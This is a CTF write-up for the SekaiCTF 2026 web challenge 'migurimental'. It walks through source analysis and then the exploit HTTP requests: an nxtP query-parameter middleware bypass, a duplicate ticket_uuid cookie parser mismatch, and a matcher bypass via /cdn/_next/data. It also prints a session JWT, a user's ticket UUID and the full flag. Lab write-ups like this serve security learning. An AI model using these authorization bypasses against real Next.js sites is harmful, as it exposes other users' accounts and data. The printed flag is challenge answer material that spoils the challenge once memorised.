---
title: "SekaiCTF2026-web/migurimental"
description: "CTF writeup - web/migurimental (SekaiCTF 2026)"
date: 2026-06-29
tags: [CTF, Web, SekaiCTF]
category: "SekaiCTF 2026"
cover: ./cover.png
pinned: false
draft: false
---

### Source analysis

The system consists of two Next.js apps (`backstage1`, `backstage2`) behind an nginx reverse proxy. `config/nginx.conf` injects some internal headers before forwarding the request, among them `X-Real-Migu`:

```nginx
proxy_set_header X-Real-Migu $remote_addr;
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
proxy_set_header X-Forwarded-Host $host;
proxy_set_header X-Forwarded-Proto $scheme;
```

Because this header is set by nginx, a client cannot set it from the outside.

`backstage1` has a middleware that authenticates the JWT session and then applies extra conditions to two routes (`apps/backstage1/middleware.js`):

```js
if (request.nextUrl.pathname === '/access-card') {
  const checkedId = request.nextUrl.searchParams.get('id')
  if (checkedId !== session.sub) return deny(request)
}

if (request.nextUrl.pathname === '/backroom') {
  const expectedTicket = session.ticketUuid
  const middlewareTicket = request.cookies.get('ticket_uuid')?.value || ''
  if (!expectedTicket || middlewareTicket !== expectedTicket) return deny(request)
}
```

- `/access-card`: only allowed when the `id` parameter in the URL equals `session.sub` (the user's id in the JWT).
- `/backroom`: only allowed when the `ticket_uuid` cookie equals `session.ticketUuid`.

The `/access-card` page reads `query.id`, looks up the corresponding user and renders a QR code encoding that user's `ticketUuid` (`apps/backstage1/pages/access-card.js`):

```js
export async function getServerSideProps({ query }) {
  const user = await findById(query.id)
  if (!user) return { notFound: true }
  const qrDataUrl = await QRCode.toDataURL(user.ticketUuid, ...)
  return { props: { user: { id: user.id, username: user.username, tier: user.tier }, qrDataUrl } }
}
```

The `/backroom` page looks up the user by the `ticket_uuid` cookie; if that user has `id === 1` it returns `backstageNote` from `readFirstFlagHalf()`, otherwise it returns 403 (`apps/backstage1/pages/backroom.js`):

```js
const ticketUser = await findByTicketUuid(req.cookies.ticket_uuid || '')
if (ticketUser?.id !== 1) {
  res.statusCode = 403
  return { props: { backstageNote: '', denied: true } }
}
return { props: { backstageNote: await readFirstFlagHalf(), denied: false } }
```

`backstage2` has a middleware that only allows access to `/` when the `x-real-migu` header has the correct internal value, otherwise it redirects to `/rejected` (`apps/backstage2/middleware.js`):

```js
if (request.nextUrl.pathname === '/') {
  const realMigu = request.headers.get('x-real-migu') || ''
  if (realMigu !== '1.3.3.7') {
    return NextResponse.redirect(new URL('/rejected', request.url))
  }
}
```

This middleware declares `matcher: ['/']`, while `next.config.js` sets `assetPrefix: '/cdn'`:

```js
export const config = { matcher: ['/'] }
```
```js
module.exports = { assetPrefix: '/cdn' }
```

### Exploitation

#### Bypassing /access-card with nxtP

![](./image.png)

After registering/logging in we have `session.sub` (our own id), `session.ticketUuid`, and our own `ticket_uuid` cookie.

![](./image-1.png)

![](./image-2.png)

The middleware checks `/access-card` with `searchParams.get('id') === session.sub`, while the Pages router reads `query.id` in `getServerSideProps`.

Send the request:

```http
GET /access-card?id=1&nxtPid=198
```

In the middleware, Next.js normalizes keys with the `nxtP` prefix, so `nxtPid` is interpreted as `id`. The middleware sees `id=<my_id>` and lets it through. Meanwhile `getServerSideProps` still takes the raw original `query.id` which is `1`, so the page renders the access card of user `miku`:

```text
id: 1
username: miku
tier: VIP
```

![](./image-3.png)

#### Getting Miku's ticket

In the returned HTML there is a QR as a data URL (`data:image/png;base64,...`).

Decode it into a PNG file and read the QR.

![](./image-4.png)

Miku's ticket UUID:

```text
92ca07cc-13bd-4d2b-b6b3-e8399790078a
```

#### Duplicate cookie parser mismatch at /backroom

Send a cookie header with two `ticket_uuid`:

```http
Cookie: ticket_uuid=92ca07cc-13bd-4d2b-b6b3-e8399790078a; session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im5ndXllbnZhbmEiLCJ0aWVyIjoiUkVHVUxBUiIsInRpY2tldFV1aWQiOiJmNmQ4NjZmOS01NmNkLTQ3N2MtYjI4Yy1iN2JiN2FiYTFhYzUiLCJzdWIiOiIxOTgiLCJpYXQiOjE3ODMwNDE4Njd9.2ufRxsvqyGuL4vtI4HboMboERWl8Tnsz1HrCU7aZi_Q; ticket_uuid=f6d866f9-56cd-477c-b28c-b7bb7aba1ac5
```

The middleware sees:
- the last `ticket_uuid` is our own ticket, which matches `session.ticketUuid` so it lets us proceed.
- `getServerSideProps` sees the first `ticket_uuid` which is miku's ticket, so `findByTicketUuid()` returns user id `1`; the `/backroom` page returns half of the flag.

```http
GET /backroom HTTP/1.1
Host: migurimental.chals.sekai.team
Cookie: ticket_uuid=92ca07cc-13bd-4d2b-b6b3-e8399790078a; session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im5ndXllbnZhbmEiLCJ0aWVyIjoiUkVHVUxBUiIsInRpY2tldFV1aWQiOiJmNmQ4NjZmOS01NmNkLTQ3N2MtYjI4Yy1iN2JiN2FiYTFhYzUiLCJzdWIiOiIxOTgiLCJpYXQiOjE3ODMwNDE4Njd9.2ufRxsvqyGuL4vtI4HboMboERWl8Tnsz1HrCU7aZi_Q; ticket_uuid=f6d866f9-56cd-477c-b28c-b7bb7aba1ac5
```

![](./image-5.png)

Half of the flag:

```text
SEKAI{7h3_l33k_15_b4ck_7h3_cr0wd_15_ch33r1ng_4nd_7h3_
```
#### Bypassing app 2's middleware via `/cdn/_next/data`

Accessing `/` directly on app 2 gets redirected to `/rejected` by the middleware (because the internal `x-real-migu` header is missing).

But the middleware only declares `matcher: ['/']`, while `next.config.js` sets `assetPrefix: '/cdn'`, so the index page's data route can still be served through the `/cdn` prefix.

Open `/rejected` and find the `buildId`:

![](./image-6.png)


```text
"buildId":"VlOPiWVknxOpNtTjt6ctd"
```

Then call the index page's data route through the `/cdn` prefix:

```http
GET /cdn/_next/data/VlOPiWVknxOpNtTjt6ctd/index.json HTTP/1.1
Host: migurimental-2.chals.sekai.team
```

![](./image-7.png)

The other half of the flag:

```text
c0nc3r7_c4n_f1n4lly_b3g1n_m1ku_m1ku_b34mmmmmmmmmmmm}
```

### Flag

```
SEKAI{7h3_l33k_15_b4ck_7h3_cr0wd_15_ch33r1ng_4nd_7h3_c0nc3r7_c4n_f1n4lly_b3g1n_m1ku_m1ku_b34mmmmmmmmmmmm}
```
